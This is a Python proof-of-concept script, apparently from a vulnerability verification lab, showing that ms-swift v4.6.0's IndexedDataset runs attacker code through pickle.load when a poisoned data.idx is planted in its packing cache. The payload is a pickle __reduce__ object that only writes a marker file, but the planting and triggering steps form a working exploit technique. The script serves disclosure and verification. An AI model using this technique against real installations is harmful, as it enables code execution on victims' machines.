"""ms-swift v4.6.0 IndexedDataset pickle RCE at __init__ (data.idx, function level).

The verbatim pinned upstream ``swift/dataset/indexed_dataset.py`` is executed with the
swift/modelscope package tree stubbed (StubTree); ``os``, ``pickle``, ``mmap`` and the
upstream ``BinReader`` are the real upstream code paths.  ``IndexedDataset.__init__``
opens ``data.idx`` with ``pickle.load(f)``; a pickled reducing payload planted in the
packing cache executes during the upstream unpickle.
"""

from __future__ import annotations

import json
import pickle
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "lab" / "upstream_verify"))
from stublib import StubTree  # noqa: E402


def _materialize(marker_path: str, marker_text: str):
    Path(marker_path).write_text(marker_text, encoding="utf-8")
    return {"idx": [], "length": [], "n_shard": 0, "shard_offset": []}


class _Payload:
    def __init__(self, marker_path: str, marker_text: str):
        self.marker_path = marker_path
        self.marker_text = marker_text

    def __reduce__(self):
        return (_materialize, (self.marker_path, self.marker_text))


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    source = poclib.upstream_path(manifest["root_cause"]["source"])
    if not source.is_file():
        poclib.fail(f"missing pinned upstream source: {source}")

    tree = StubTree(["swift", "modelscope"]).install()
    cache = poclib.EVIDENCE_DIR / "packing-cache"
    tree.seed("modelscope.hub.utils.utils", get_cache_dir=lambda *a, **k: str(cache))
    module = tree.load(source, "uv_swift_indexed_dataset")
    if not hasattr(module, "IndexedDataset"):
        poclib.fail("upstream indexed_dataset module did not expose IndexedDataset")

    poclib.start_marker("ABSENT")
    # upstream get_cache_dir joins the returned dir with 'tmp' and the dataset name
    poisoned = cache / "tmp" / "poisoned"
    poisoned.mkdir(parents=True, exist_ok=True)
    payload = _Payload(str(poclib.MARKER_FILE), poclib.MARKER_TEXT)
    (poisoned / "data.idx").write_bytes(pickle.dumps(payload, protocol=4))

    post_sink_error = None
    try:
        module.IndexedDataset("poisoned")
    except Exception as exc:  # the sink has already executed the payload
        post_sink_error = f"{type(exc).__name__}: {exc}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written inside the upstream pickle.load sink",
                    post_sink_error=post_sink_error)

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+IndexedDataset()+pickle.load(data.idx)",
                "entrypoint": "swift.dataset.indexed_dataset.IndexedDataset.__init__",
                "source": poclib.rel(source),
                "source_sha256": poclib.sha256_file(source),
                "sink_line": manifest["root_cause"]["line"],
                "sink": manifest["root_cause"]["snippet"],
                "cache_dir": poclib.rel(poisoned),
                "payload": "pickle __reduce__ -> _materialize(marker)",
                "post_sink_error": post_sink_error,
                "stubbed_modules": tree.manifest()["stubbed_modules"],
            },
            "request_response": [
                {
                    "dir": "attacker-written packing cache -> IndexedDataset -> pickle.load",
                    "payload": "pickle reduce",
                    "result": "marker written inside the upstream sink",
                }
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
